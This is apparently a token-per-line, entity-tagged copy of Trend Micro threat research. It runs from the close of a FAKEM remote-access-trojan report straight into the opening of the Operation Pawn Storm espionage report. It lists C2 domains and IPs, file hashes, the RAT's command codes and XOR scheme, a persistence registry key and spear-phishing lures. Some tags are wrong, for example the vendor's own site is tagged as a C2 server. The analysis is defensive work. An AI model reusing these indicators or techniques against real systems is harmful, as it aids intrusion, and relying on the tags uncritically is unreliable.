MSCOMCTL.OCX
RCE
Vulnerability
addressed
in
Microsoft
Security
Bulletin
MS12-027.4

We
also
found
a
Microsoft®
Excel®
file
that
exploits
CVE-2009-3129
,
the
Excel
Featheader
Record
Memory
Corruption
Vulnerability
addressed
in
Microsoft
Security
Bulletin
MS09-067.5
We
also
saw
samples
that
were
simply
executable
(
.EXE
)
files
.

3
http://technet.microsoft.com/en-us/security/bulletin/MS10-087 B_url.normal

4
http://technet.microsoft.com/en-us/security/bulletin/ms12-027 B_url.normal

5
http://technet.microsoft.com/en-us/security/bulletin/MS09-067 B_url.normal

2
|
FAKEM B_malware.backdoor
RAT I

Installation

After
exploitation
,
an
.EXE
file
packed
with
UPX
is
dropped.6
After
initially
dropping
the
malicious
file
named
hkcmd.exe
to
the
%
Temp
%
folder
,
the
malware
typically
copies
itself
using
the
name
,
tpframe.exe
,
to
the
%
System
%
folder
.

It
then
adds
the
following
registry
entry
to
enable
its
automatic
execution
at
every
system
startup
:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\
Windows\CurrentVersion\policies\Explorer\run
tpbar
=
'
%
System%\tpframe.exe
'

Backdoor

The
network
traffic
the
malware
produces
is
designed
to
look
like
Windows
Messenger
traffic
.

Malware
of
this
type
were
discussed
on
Twitter
,
noted
by
SonicWALL
,
and
found
to
have
been
active
as
far
back
as
September
2009.7
However
,
it
remains
unclear
if
all
the
attacks
that
used
this
malware
were
connected
.

The
malicious
traffic
begins
with
headers
similar
to
actual
Windows
Messenger
traffic
:

MSG
5
N
130
MIME-Version
:
1.0

However
,
beyond
this
,
you
will
see
that
the
traffic
is
not
valid
Windows
Messenger
traffic
but
may
be
sufficiently
disguised
as
such
to
escape
further
scrutiny
.

6

UPX
is
a
free
tool
that
compresses
executable
files
.

However
,
it
is
commonly
used
to
pack
malware
files
,
see
http://upx.sourceforge.net/ B_url.normal
for
more
details
.

7
https://twitter.com/mikko/status/232851667446538241 B_url.normal
,
https://www.mysonicwall.com/sonicalert/searchresults.aspx?ev=article&id=464 B_url.normal
,
and
https://twitter.com/diocyde/statuses/232873023651336192 B_url.normal

3
|
FAKEM B_malware.backdoor
RAT I

FIGURE
2
:
Malicious
traffic
disguised
as
legitimate
Windows
Messenger
traffic

FIGURE
3
:
Legitimate
Windows
Messenger
traffic

Compared
with
actual
Windows
Messenger
traffic
shown
in
Figure
3
,
it
is
easy
to
distinguish
the
malicious
traffic
shown
in
Figure
2
.

During
our
investigation
of
the
fake
'Windows
Messenger
'
RAT B_malware.backdoor
,
we
found
another
version
that
attempts
to
disguise
its
network
traffic
as
Yahoo
!

Messenger
traffic
.

The
network
communication
this
version
uses
begins
with
YMSG
,
the
Yahoo
!

Messenger
traffic
header
.

FIGURE
4
:
Malicious
traffic
disguised
as
Yahoo
!

Messenger
traffic

FIGURE
5
:
Legitimate
Yahoo
!

Messenger
traffic

However
,
the
network
traffic
shown
in
Figure
4
does
not
resemble
legitimate
Yahoo
!

Messenger
traffic
beyond
the
use
of
the
header
,
YMSG
.

Compared
with
the
legitimate
Yahoo
!

Messenger
traffic
shown
in
Figure
5
,
it
is
easy
to
distinguish
between
the
two
.

A
third
version
of
the
FAKEM B_malware.backdoor
RAT I
attempts
to
disguise
the
network
traffic
it
produces
as
HTML
.

The
malicious
traffic
begins
with
strings
like
<
html
>
<
title
>
1..56
<
/title
>
<
body
>
or
<
html><title>12356</title><body>.8

8

This
variant
was
referenced
during
an
incident
documented
by
AlienVault
in
March
2012
in
http://labs.alienvault.com/labs/index.php/2012/alienvault-research-used-as-lure-in-targeted-attacks/ B_url.normal
.

4
|
FAKEM B_malware.backdoor
RAT I

This
is
a
fairly
rudimentary
disguise
and
odd
because
you
would
expect
HTML
to
be
the
result
of
a
request
to
a
web
server
and
not
as
something
a
client
would
send
to
a
web
server
.

FIGURE
6
:
Malicious
traffic
disguised
as
HTML
traffic

Network
Traffic
Encryption

The
network
communication
between
the
compromised
computer
and
the
RAT B_malware.backdoor
controller
is
encrypted
.

The
encryption
is
the
same
across
variants
and
done
at
the
bit
level
.

Each
byte
is
XOR-ed
by
every
letter
in
the
string
,
YHCRA
,
and
rotated
3
bits
to
the
right
after
every
XOR
operation
.

Encrypting
the
communication
ensures
that
the
suspicious
data
passed
between
the
compromised
host
and
the
attackers
can
not
be
easily
viewed
in
plain
text
.

The
communication
comes
in
1024-byte
blobs
of
data
that
start
with
the
32-byte
header
.

It
appears
that
attackers
may
specify
any
kind
of
fake
headers
within
the
first
32
bytes
in
order
to
disguise
the
subsequent
network
traffic
.

The
following
bits
of
information
are
initially
sent
by
the
compromised
host
when
the
communication
starts
:

•
User
name

•
Computer
name

•
OEM
code
page
identifier

•
What
looks
like
a
campaign
code
but
only
for
some
samples

The
commands
are
not
preconfigured
as
the
malware
relies
on
the
data
sent
by
the
server
.

For
instance
,
when
a
client
receives
the
command
,
0211
,
this
signifies
that
it
should
execute
the
accompanying
data
in
memory
.

5
|
FAKEM B_malware.backdoor
RAT I

The
following
are
the
commands
the
server
issues
and
their
meanings
:

•
0211
:
Execute
code
.

•
0212
:
Reconnect
to
receive
data
.

•
0213
:
Sleep
,
close
socket
,
and
reconnect
.

•
0214
:
Exit
.

To
determine
the
RAT B_malware.backdoor
's
capabilities
,
we
allowed
the
attackers
to
infiltrate
a
honeypot
computer
and
captured
all
of
the
network
traffic
it
generated
.

We
decrypted
the
network
traffic
and
determined
the
commands
the
attackers
used
,
which
include
:

•
CmdMana
:
Command
Manager
allows
attackers
to
execute
shell
commands
.

•
FileMan
:
File
Manager
allows
the
attackers
to
browse
directories
.

•
HostIn
:
Host
Information
provides
information
about
the
compromised
computer
.

•
ProcMan
:
Process
Manager
gives
attackers
access
to
running
processes
.

•
RegMana
:
Registry
Manager
gives
attackers
access
to
the
Windows
registry
.

•
Scree
:
Screen
takes
a
snapshot
of
the
desktop
.

•
ServiceMa
:
Service
Manager
allows
access
to
services
.

•
Passwo
:
Password
accesses
stored
passwords
like
those
saved
in
Internet
Explorer
(
IE
)
.

•
UStea
:
Uploads
files
from
a
compromised
computer
.

6
|
FAKEM B_malware.backdoor
RAT I

Infrastructure

The
Windows
Messenger
samples
we
analyzed
were
clustered
into
five
groups
that
did
not
have
overlapping
linkages
.

Four
of
the
clusters
were
relatively
small
and
focused
on
four
different
domains
:

•
vcvcvcvc.dyndns.org B_url.cncsvr

•
zjhao.dtdns.net B_url.cncsvr

•
avira.suroot.com B_url.cncsvr

•
*.googmail.com B_url.cncsvr

The
vcvcvcvc.dyndns.org B_url.cncsvr
domain
is
particularly
interesting
because
we
also
found
it
being
used
as
a
command-and-control
(
C
&
C
)
server
for
Protux—a
wellknown
malware
family
that
has
been
used
in
many
targeted
attacks
over
the
years
.

We
also
found
that
the
avira.suroot.com B_url.cncsvr
domain
used
as
a
C
&
C
server
for
yet
another
malware
family
we
call
'cxgid
.
'

The
*.googmail.com B_url.cncsvr
domain
was
slightly
larger
and
included
names
like
apple12.crabdance.com B_url.cncsvr
and
apple12.co.cc B_url.cncsvr
.

However
,
the
largest
cluster
revolved
around
the
*.yourturbe.org B_url.cncsvr
domain
and
overlapped
with
the
HTML
variant
.

We
also
found
small
clusters
of
the
HTML
variant
that
revolved
around
the
domain
,
endless.zapto.org B_url.cncsvr
,
which
was
downloaded
as
a
second-stage
malware
by
Protux
.

FIGURE
7
:
FAKEM
domains
associated
with
the
Windows
Messenger
and
HTML
variants

7
|
FAKEM B_malware.backdoor
RAT I

Meanwhile
,
the
Yahoo
!

Messenger
samples
we
analyzed
all
accessed
freeavg
.

sytes.net—a
domain
name
that
frequently
resolved
to
different
IP
addresses
.

FIGURE
8
:
FAKEM
domains
associated
with
the
Yahoo
!

Messenger
variant

The
various
samples
we
collected
appear
to
belong
to
groups
that
overlapped
a
little
.

This
suggests
that
rather
than
being
associated
with
a
particular
campaign
,
the
use
of
various
FAKEM B_malware.backdoor
RATs I
could
be
distributed
among
multiple
threat
actors
.

Conclusion

Knowledge
of
the
attack
tools
,
techniques
,
and
infrastructure
of
adversaries
is
critical
for
developing
defensive
strategies
.

This
research
paper
examined
three
variants
of
a
RAT—FAKEM—that
attempt
to
disguise
the
network
traffic
they
produce
to
stay
under
the
radar
.

Now
that
popular
RATs B_malware.backdoor
like
Gh0st B_malware.backdoor
and
PoisonIvy B_malware.backdoor
have
become
well-known
and
can
easily
be
detected
,
attackers
are
looking
for
methods
to
blend
in
with
legitimate
traffic
.

While
it
is
possible
to
distinguish
the
network
traffic
FAKEM B_malware.backdoor
RAT I
variants
produce
for
the
legitimate
protocols
they
aim
to
spoof
,
doing
so
in
the
context
of
a
large
network
may
not
be
not
easy
.

The
RAT B_malware.backdoor
's
ability
to
mask
the
traffic
it
produces
may
be
enough
to
provide
attackers
enough
cover
to
survive
longer
in
a
compromised
environment
.

Fortunately
,
solutions
like
Trend
MicroTM
Deep
Discovery
can
help
network
administrators
protect
their
organizations
from
attacks
that
use
the
FAKEM B_malware.backdoor
RAT I
by
detecting
the
traffic
its
variants
produce
.

8
|
FAKEM B_malware.backdoor
RAT I

TREND
MICRO
INCORPORATED

Trend
Micro
Incorporated
(
TYO
:
4704
;
TSE
:
4704
)
,
a
global
cloud
security
leader
,
creates
a
world
safe
for
exchanging
digital
information
with
its
Internet
content
security
and
threat
management
solutions
for
businesses
and
consumers
.

A
pioneer
in
server
security
with
over
20
years
'
experience
,
we
deliver
top-ranked
client
,
server
and
cloud-based
security
that
fits
our
customers
'
and
partners
'
needs
,
stops
new
threats
faster
,
and
protects
data
in
physical
,
virtualized
and
cloud
environments
.

Powered
by
the
industry-leading
Trend
MicroTM
Smart
Protection
NetworkTM
cloud
computing
security
infrastructure
,
our
products
and
services
stop
threats
where
they
emerge—from
the
Internet
.

They
are
supported
by
1,000+
threat
intelligence
experts
around
the
globe
.

TREND
MICRO
INCORPORATED

10101
N
.

De
Anza
Blvd
.

Cupertino
,
CA
95014

U.S.
toll
free
:
1
+800.228.5651

Phone
:
1
+408.257.1500

Fax
:
1
+408.257.2003

www.trendmicro.com B_url.cncsvr

©2013
by
Trend
Micro
Incorporated
.

All
rights
reserved
.

Trend
Micro
and
the
Trend
Micro
t-ball
logo
are
trademarks
or
registered
trademarks
of
Trend
Micro
Incorporated
.

All
other
product
or
company
names
may
be
trademarks
or
registered
trademarks
of
their
owners
.
Operation
Pawn B_malware.infosteal
Storm I

Using
Decoys
to
Evade
Detection

Loucif
Kharouni

Feike
Hacquebord

Numaan
Huq

Jim
Gogolinski

Fernando
Mercês

Alfred
Remorin

Douglas
Otis

Forward-Looking
Threat
Research
Team

A
Trend
Micro
Research
Paper

CONTENTS

Introduction
....................................................................................................................................1

Ties
That
Bind
the
Operation
Pawn B_malware.infosteal
Storm I
Attacks
Together
.........................................................2

SEDNIT....................................................................................................................................2

Attack
Timeline
........................................................................................................................2

Attack
Details
...........................................................................................................................4

Attack
Evolution
.......................................................................................................................5

Next-Level
Phishing
Targets
..................................................................................................11

Case
1
:
Ministry
of
Defense
,
Hungary
.............................................................................11

Case
2
:
OSCE
,
Austria
....................................................................................................13

Case
3
:
SAIC
,
United
States
...........................................................................................13

Case
4
:
Academi
..............................................................................................................13

Other
Webmail
Services
........................................................................................................14

Conclusion
...................................................................................................................................16

References
..................................................................................................................................17

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

TREND
MICRO
LEGAL
DISCLAIMER

The
information
provided
herein
is
for
general
information
and
educational
purposes
only
.

It
is
not
intended
and
should
not
be
construed
to
constitute
legal
advice
.

The
information
contained
herein
may
not
be
applicable
to
all
situations
and
may
not
reflect
the
most
current
situation
.

Nothing
contained
herein
should
be
relied
on
or
acted
upon
without
the
benefit
of
legal
advice
based
on
the
particular
facts
and
circumstances
presented
and
nothing
herein
should
be
construed
otherwise
.

Trend
Micro
reserves
the
right
to
modify
the
contents
of
this
document
at
any
time
without
prior
notice.Translations
of
any
material
into
other
languages
are
intended
solely
as
a
convenience
.

Translation
accuracy
is
not
guaranteed
nor
implied
.

If
any
questions
arise
related
to
the
accuracy
of
a
translation
,
please
refer
to
the
original
language
official
version
of
the
document
.

Any
discrepancies
or
differences
created
in
the
translation
are
not
binding
and
have
no
legal
effect
for
compliance
or
enforcement
purposes.Although
Trend
Micro
uses
reasonable
efforts
to
include
accurate
and
up-to-date
information
herein
,
Trend
Micro
makes
no
warranties
or
representations
of
any
kind
as
to
its
accuracy
,
currency
,
or
completeness
.

You
agree
that
access
to
and
use
of
and
reliance
on
this
document
and
the
content
thereof
is
at
your
own
risk
.

Trend
Micro
disclaims
all
warranties
of
any
kind
,
express
or
implied
.

Neither
Trend
Micro
nor
any
party
involved
in
creating
,
producing
,
or
delivering
this
document
shall
be
liable
for
any
consequence
,
loss
,
or
damage
,
including
direct
,
indirect
,
special
,
consequential
,
loss
of
business
profits
,
or
special
damages
,
whatsoever
arising
out
of
access
to
,
use
of
,
or
inability
to
use
,
or
in
connection
with
the
use
of
this
document
,
or
any
errors
or
omissions
in
the
content
thereof
.

Use
of
this
information
constitutes
acceptance
for
use
in
an
'as
is
'
condition
.

INTRODUCTION

Operation
Pawn B_malware.infosteal
Storm I
refers
to
economic
and
political
espionage
attacks
instigated
by
a
group
of
threat
actors
primarily
targeting
military
,
embassy
,
and
defense
contractor
personnel
from
the
United
States
and
its
allies
.

Opposing
factions
to
and
dissidents
of
the
Russian
government
,
international
media
,
and
even
the
national
security
department
of
a
U.S.
ally
were
also
targeted
.

The
threat
actors
used
three
attack
vectors―
spear-phishing
emails
with
malicious
attachments
,
an
advanced
network
of
phishing
websites
,
and
exploits
injected
into
legitimate
conference
and
media
websites
.

They
used
a
nonmalicious
JavaScript
to
victimize
MicrosoftTM
Outlook®
Web
Access
(
OWA
)
users
from
carefully
selected
target
organizations
.

The
OWA
phishing
attacks
proved
extremely
effective
and
could
be
particularly
dangerous
to
any
organization
that
allows
employees
to
use
OWA
.

An
in-depth
look
at
six
multistage
attacks
revealed
one
thing
in
common―the
use
of
SEDNIT B_malware.backdoor
/
Sofacy
malware
[
1
]
,
[
2
]
.

The
use
of
such
multistage
downloaders
provided
attackers
additional
protection
against
detection
.

We
believe
the
threat
actors
aimed
to
confuse
their
targets
'
IT
administrators
by
making
it
hard
for
them
to
string
attack
components
together
,
thus
evading
detection
.

This
research
paper
details
when
certain
attacks
occurred
,
what
tools
were
used
in
attempts
to
get
in
to
target
networks
,
and
target
profiles
to
form
a
general
picture
of
Operation
Pawn B_malware.infosteal
Storm I
.

1

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

TIES
THAT
BIND
THE
OPERATION
Pawn B_malware.infosteal
Storm I
ATTACKS
TOGETHER

SEDNIT B_malware.backdoor

Attack
Timeline

SEDNIT B_malware.backdoor
malware
are
mostly
backdoors
[
3
]
,
[
4
]
and
information
stealers
[
5
]
that
log
affected
users
'
keystrokes
,
steal
system
information
,
and
send
stolen
information
to
remote
command-and-control
(
C
&
C
)
servers
.

Analyses
of
the
SEDNIT B_malware.backdoor
infectors
that
arrived
as
email
attachments
in
the
attacks
featured
in
this
paper
revealed
six
distinct
chains
[
see
diagram
on
page
3
]
.

The
investigation
focused
on
a
group
of
attacks
that
has
been
dubbed
'Operation
Pawn B_malware.infosteal
Storm I
'
[
6
]
due
to
the
attackers
'
use
of
two
or
more
connected
tools/tactics
to
attack
a
specific
target
similar
to
the
chess
strategy
it
was
named
after
.

This
paper
illustrates
how
the
Pawn B_malware.infosteal
Storm I
attacks
were
carried
out
with
the
aid
of
five
spear-phishing
emails
,
which
used
contextually
relevant
subjects
to
get
specific
targets
from
different
countries
to
open
weaponized
attachments
designed
to
compromise
their
systems
.

Timeline
of
spear-phishing
emails
sent
to
specific
targets

The
attackers
sent
emails
to
potential
victims
,
including
military
,
embassy
,
and
defense
contractor
personnel
.

The
following
emails
were
among
those
that
were
found
related
to
this
operation
:

•
An
email
sent
to
a
potential
victim
from
the
Ministry
of
Defense
in
France
had
an
exploit
for
CVE-2010-3333
[
7
]
disguised
as
a
document
named
'International
Military.rtf
.
'

Trend
Micro
received
a
sample
of
this
on
October
17
,
2011
and
has
been
detecting
it
as
TROJ_ARTIEF.AP
[
8
]
since
then
.

•
An
email
sent
to
a
potential
victim
working
from
the
Vatican
Embassy
in
Iraq
used
reports
of
a
bombing
incident
[
9
]
that
occurred
on
January
9
,
2012
as
social
engineering
lure
.

2

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

SEDNIT B_malware.backdoor
infectors
attached
to
targeted
attack
campaign
emails

Sent
a
day
after
the
incident
,
the
email
had
a
Microsoft
Word®
file
attachment
named
'IDF_Spokesperson_Terror_
Attack_011012.doc
,
'
which
exploited
CVE-2012-0158
[
10
]
.

Sample
email
sent
to
recipients
from
the
Vatican
Embassy
in
Iraq

Exploit
for
CVE-2012-0158
disguised
as
a
Word
(
.DOC
)
file

3

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

doc
,
'
which
exploited
CVE-2012-0158
.

•
An
email
sent
on
September
20
,
2013
to
military
officials
from
several
countries
used
the
then-upcoming
'Asia-Pacific
Economic
Cooperation
(
APEC
)
Indonesia
2013
'
conference
as
bait
.

The
email
had
two
Microsoft
Excel®
file
attachments
named
'APEC
Media
list
2013
Part1.xls
,
'
which
exploited
CVE-2012-0158
,
and
'APEC
Media
list
2013
Part2.xls
,
'
which
was
nonmalicious
.

Sample
email
sent
to
military
officials
from
Pakistan
using
the
'Homeland
Security
Summit
Middle
East
'
conference
as
bait

•
An
email
sent
to
Polish
government
employees
[
12
]
on
August
11
,
2014
had
a
MIME
HTML
(
.MHT
)
file
attachment
named
'MH17.doc
,
'
which
exploited
CVE-2012-0158
.

Sample
email
sent
to
military
officials
across
countries
using
the
'APEC
Indonesia
2013
'
conference
as
bait

Exploit
for
CVE-2012-0158
disguised
as
an
Excel
(
.XLS
)
file
(
APEC
Media
list
2013
Part1.xls
)

•
An
email
sent
to
Pakistani
military
officials
on
January
23
,
2014
used
the
'Homeland
Security
Summit
Middle
East
'
[
11
]
conference
as
bait
.

It
had
a
Word
file
attachment
named
'Details
.

Exploit
for
CVE-2012-0158
disguised
as
a
MIME
HTML
(
.MHT
)
file

Attack
Details

All
of
the
observed
Operation
Pawn B_malware.infosteal
Storm I
attacks
comprised
several
stages
.

Each
attack
had
at
least
two
phases
:

•
In
phase
1
,
opening
the
email
attachment
displays
a
decoy
document
while
the
exploit
runs
in
the
background
.

The
exploit
drops
a
downloader
component
(
.DLL
file
)
named
'netids.dll
,
'
'netidt.dll
,
'
or
'coreshell.dll
.
'

4

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

•
In
phase
2
,
the
downloader
component
communicates
with
a
C
&
C
server
and
downloads
a
dropper
that
ultimately
installs
a
keylogger
.

After
capturing
information
from
infected
systems
,
the
keylogger
sends
data
back
to
the
C
&
C
server
.

Phases
1
and
2
in
an
Operation
Pawn B_malware.infosteal
Storm I
attack

We
only
managed
to
collect
latter-stage
payloads
for
two
out
of
the
six
aforementioned
attacks
.

The
C
&
C
servers
tied
to
the
other
four
attacks
refused
to
serve
the
rest
of
the
files
to
complete
the
attack
chains
.

Multistage
attacks
are
a
double-edged
sword
.

If
one
link
in
the
attack
chain
,
aside
from
the
end
node
,
is
detected
and
removed
in
the
initial
infection
stage
,
the
entire
attack
fails
.

On
the
other
hand
,
having
several
links
in
the
attack
chain
makes
detecting
the
final
component
more
difficult
.

Tracing
the
previous
and
next
links
is
also
difficult
when
any
of
the
components
is
inspected
on
its
own
outside
the
attack
chain
.

Although
some
of
the
C
&
C
servers
were
still
alive
at
the
time
of
investigation
,
they
did
not
respond
to
our
infected
systems
.

Repeated
attempts
to
trick
the
C
&
C
servers
into
serving
the
next
files
in
the
incomplete
attack
chains
failed
.

The
attacks
they
were
tied
to
could
be
time
sensitive
and
it
is
possible
that
they
no
longer
hosted
the
files
for
succeeding
stages
.

Attack
Evolution

Even
though
the
filenames
used
for
different
components
remained
fairly
consistent
from
2010
to
the
present
,
earlier
attacks
were
more
elaborate
and
complex
compared
with
those
seen
this
year
.

The
2014
attacks
we
have
seen
were
more
streamlined
.

5

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Comparison
of
an
Operation
Pawn B_malware.infosteal
Storm I
attack
in
2011
and
another
in
2014

Although
variations
in
past
and
current
attack
chains
exist
,
both
are
still
being
used
by
threat
actors
to
date
to
ensure
one
thing—detection
evasion
.

The
following
table
compares
and
contrasts
the
six
Operation
Pawn B_malware.infosteal
Storm I
attacks
in
greater
detail
.

6

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Case
1

Case
2

Case
3
[
13
]

Case
4

Case
5

Case
6

Operation
Pawn B_malware.infosteal
Storm I
Attack
Comparison

Unknown
exploit
,
possibly
disguised
as
a
.PDF
,
.DOC
,
or
.RTF
file
,
carries
the
top-level
dropper
(
dropper.exe
;
SHA-1
:
72cfd996957bde06a02b0adb2d66d8aa9c25bf37 B_hash
)

.RTF
file
exploits
CVE-2010-3333
(
SHA-1
:
956d1a360
55c903cb570890da
69deabaacb5a18a
)
and
drops
saver.scr
(
SHA-1
:
e8b55d9aeff124df4008b0d372bf2f2d3e5e5ae7 B_hash
)

Unknown
exploit
carries
a
dropper
(
Dropper
DLL
;
SHA-1
:
9c622b39521183dd71ed2a174031ca159beb6479 B_hash
)

•
First
file
(
APEC
Media
list
2013
Part1.xls
;
SHA-1
:
a90921c182cb90807102ef402719ee8060910 B_hash
345
)
exploits
CVE-2012-0158

•
Second
file
Two
.XLS
files
come
with
spear-phishing
emails
:
(
APEC
Media
list
2013
Part2.xls
;
SHA-1
:
b3098f99db1f80e27aec0c9a5a625aedaab5899a B_hash
)
is
a
decoy
document

.RTF
file
(
SHA-1
:
78d28072fdabf0b5aac5e8f337dc768d07b63e1e B_hash
)
exploits
CVE-2012-0158
and
drops
saver.scr
(
SHA-1
:
7FBB5A2E46FACD3EE0C945F324414210C2199FFB B_hash
)
into
<
Local
Settings
>
\Temp\

.MHT
file
drops
:

•
MH17.doc
(
SHA-1
:
DAE7FAA1725DB8192AD711D759B13F8195A18821 B_hash
)
,
a
decoy
document
,
into
<
Local
Settings
>
\Temp\
•
W.q
(
SHA-1
:
8DEF0A554F19134A5DB3D2AE949F9500CE3DD2CE B_hash
)
,
a
dropper
,
into
<
Local
Settings
>
\Temp\

7

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Case
1

Case
2

Case
3
[
13
]

Case
4

Case
5

Case
6

Operation
Pawn B_malware.infosteal
Storm I
Attack
Comparison

Dropper.exe
drops
:

•
Decoy
file
•
Downloader
(
Letter
to
IAEA.pdf
;
SHA-1
:
6ada11c71a5176a82a8898680ed1eaa4e79b9bc3 B_hash
)
into
<
Local
Settings
>
\Temp\
(
netids.dll
;
SHA-1
:
c5ce5b7d10accb04a4e45c3a4dcf10d16b192e2f B_hash
)
into
<
Local
Settings
>
\
Application
Data\

Saver.scr
drops
:

•
Decoy

•
Skype.exe

document
(
Military
Cooperation.doc
;
SHA-1
:
0E12C8AB9B89B6EB6BAF16C4B3BBF9530067963F B_hash
)
into
<
Local
Settings
>
\Temp\

(
SHA-1
:
550ABD71650BAEA05A0071C4E084A803CB413C31 B_hash
)
,
a
SEDNIT B_malware.backdoor
variant
,
into
<
Local
Settings
>
\Temp\

exe
(
SHA-1
:
4B8806FE8E0CB49E4AA5D8F87766415A2DB1E9A9 B_hash
)
into
<
AppData
>
\
Microsoft\Crypt\

•
Cryptmodule
.

Dropper
DLL
drops
netids.dll
(
SHA-1
:
dd61530076152dae568b4834b1899212c96c1a02 B_hash
)
into
<
Local
Settings
>
\
Application
Data\

APEC
Media
list
2013
Part1.xls
drops
dw20.t
(
SHA-1
:
ac6b465a13370f87cf57929b7cfd1e45c3694585 B_hash
)
,
a
.DLL
file

•
Saver.scr
drops
:

•
IDF_
Spokesperson_
Targeted_
Attack_101012.doc
(
SHA-1
:
F542C5F9259274D94360013D14FFBECC43AAE552 B_hash
)
,
a
decoy
document
,
into
<
Local
Settings
>
\Temp\

Install.exe
(
SHA-1
:
BC58A8550C53689C8148B021C917FB4AEEC62AC1 B_hash
)
into
<
Local
Settings
>
\Temp\

W.q
drops
:

•
Coreshell.dll
(
SHA-1
:
A8551397E1F1A2C0148E6EADCB56FA35EE6009CA B_hash
)
into
<
Program
Files
>
\Common
Files\System\

a
copy
of
coreshell.dll
,
into
<
Program
Files
>
\Common
Files\System\

•
Tmp64.dat
,

8

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Case
1

Case
2

Case
3
[
13
]

Case
4

Case
5

Case
6

Operation
Pawn B_malware.infosteal
Storm I
Attack
Comparison

Netids.dll
communicates
with
a
C
&
C
server
(
200.106.145.122 B_ip.cncsvr
)

•
Military
Cooperation.doc
has
been
encoded
using
Cyrillic
characters
and
opens
in
Word

•
Skype.exe
drops
:

•
Downloader
(
netids.dll
;
SHA-1
:
6b875661a74c4673ae6ee89acc5cb6927ca5fd0d B_hash
)
,
a
SEDNIT B_malware.backdoor
variant
,
into
<
Windows
>
\
system32\

•
Copy
of
netids.dll
(
mscsv.tmp
)
into
<
Windows
>
\
system32\

•
Cryptmodule.exe
drops
s.vbs
(
actually
a
.PE
and
not
a
.VBS
file
)
and
communicates
with
a
C
&
C
server
(
windous
.

kz
)

Netids.dll
downloads
and
saves
msmvs.exe
(
SHA-1
:
88f7e271e54c127912db4db49e37d93aea8a49c9 B_hash
)
in
<
Local
Settings
>
\Temp\

Dw20.t
drops
netids.dll
(
SHA-1
:
3814eec8c45fc4313a9c7f65ce882a7899cf0405 B_hash
)

Install.exe
drops
netids.dll
(
SHA-1
:
14BEEB0FC5C8C887D0435009730B6370BF94BC93 B_hash
)
into
<
Windows
>
\
system32\

Coreshell.dll
downloads
conhost.dll
(
SHA-1
:
B49FAD3E5E6787E96373AC37ED58083F7572D72A B_hash
)
,
a
dropper
,
from
a
C
&
C
server

9

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Case
1

Case
2

Case
3
[
13
]

Case
4

Case
5

Case
6

Operation
Pawn B_malware.infosteal
Storm I
Attack
Comparison

C
&
C
server
confirms
receipt
of
communication
from
infected
systems
then
stops
further
interactions

•
Netids.dll
communicates
with
a
C
&
C
server
(
70.85.221.20 B_ip.cncsvr
)

•
S.vbs
(
SHA-1
:
0A3E6607D5E9C59C712106C355962B11DA2902FC B_hash
)
runs
CreateFile
C
:
\\
DOCUME~1\\
ADMINI~1\\
LOCALS~1\\
Temp\\update.exe
but
does
nothing
else

Msmvs.exe
drops
conhost.dll
(
SHA-1
:
55318328511961EC339DFDDCA0443068DCCE9CD2 B_hash
)
into
<
Local
Settings
>
\
Temp\

Netids.dll
communicates
with
a
C
&
C
server
(
70.85.221.10 B_ip.cncsvr
)

Netids.dll
communicates
with
a
C
&
C
server
(
70.85.221.10 B_ip.cncsvr
)

Conhost.dll
drops
advstoreshell.dll
(
SHA-1
:
E338A57C35A4732BBB5F738E2387C1671A002BCB B_hash
)
,
a
keylogger

Conhost.dll
drops
netui.dll
(
SHA-1
:
5A452E7248A8D3745EF53CF2B1F3D7D8479546B9 B_hash
)
,
a
keylogger
,
into
<
Windows
>
\
system32\

Netui.dll
sends
logs
of
stolen
data
to
a
C
&
C
server
(
200.74.244.118 B_ip.cncsvr
)

Advstoreshell.dll
sends
logs
of
stolen
data
to
a
C
&
C
server
(
software-update.org
)

10

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Next-Level
Phishing
Targets

countries

The
attackers
used
specially
crafted
emails
to
redirect
targets
to
any
of
several
phishing
websites
with
domain
names
that
were
very
similar
to
those
of
well-known
conferences
and
media
outfits
.

These
websites
did
not
host
malicious
content
but
visiting
them
did
lead
to
the
automatic
execution
of
a
nonmalicious
JavaScript
.

Links
to
these
fake
websites
were
then
embedded
in
spearphishing
emails
and
sent
to
selected
targets
.

Opening
such
an
email
and
clicking
the
link
in
OWA
redirected
victims
to
legitimate
websites
.

The
JavaScript
made
it
appear
that
the
victims
'
OWA
sessions
ended
while
at
the
same
time
,
tricked
them
into
reentering
their
credentials
.

To
do
this
,
the
attackers
redirected
victims
to
fake
OWA
log-in
pages
by
setting
their
browsers
'
open
windows
property
.

The
victims
'
credentials
thus
ended
up
in
the
attackers
'
hands
.

Note
that
two
special
conditions
need
to
be
met
for
the
attacks
to
succeed—victims
should
use
OWA
and
click
the
embedded
links
via
the
web
portal
's
preview
pane
.

The
attacks
worked
on
any
popular
browser
such
as
Firefox®
,
Safari®
,
ChromeTM
,
and
Internet
Explorer®
.

No
vulnerabilities
need
to
be
exploited
for
the
JavaScript
to
work
.

Because
many
companies
allow
employees
to
use
webmail
services
to
access
their
mailboxes
while
on
business
travel
or
at
home
,
these
attacks
are
likely
to
succeed
.

Once
they
do
,
attackers
can
gain
access
to
compromised
mailboxes
that
they
can
then
use
to
gain
a
foothold
in
target
networks
.

Throughout
the
course
of
investigation
,
several
targets
have
been
identified
,
including
:

•
ACADEMI
,
formerly
Blackwater
(
United
States
)

•
Broadcasting
companies
in
various

•
Military
attachés
from
various
countries

•
Ministry
of
Defense
(
France
)

•
Ministry
of
Defense
(
Hungary
)

•
Multinational
company
based
in
Germany

•
Organization
for
Security
and
Cooperation
in
Europe
(
OSCE
)
(
Austria
)

•
Pakistani
military
officials

•
Polish
government
employees

•
SAIC
(
United
States
)

•
U.S.
Department
of
State

•
Vatican
Embassy
(
Iraq
)
The
following
case
studies
reveal
more
indepth
details
on
four
specific
attacks
.

CASE
1
:
MINISTRY
OF
DEFENSE
,
HUNGARY

•
Malicious
conference
domain
:
eurosatory2014.com B_url.cncsvr

•
Real
conference
domain
:
eurosatory.com B_url.normal

•
Phished
OWA
domain
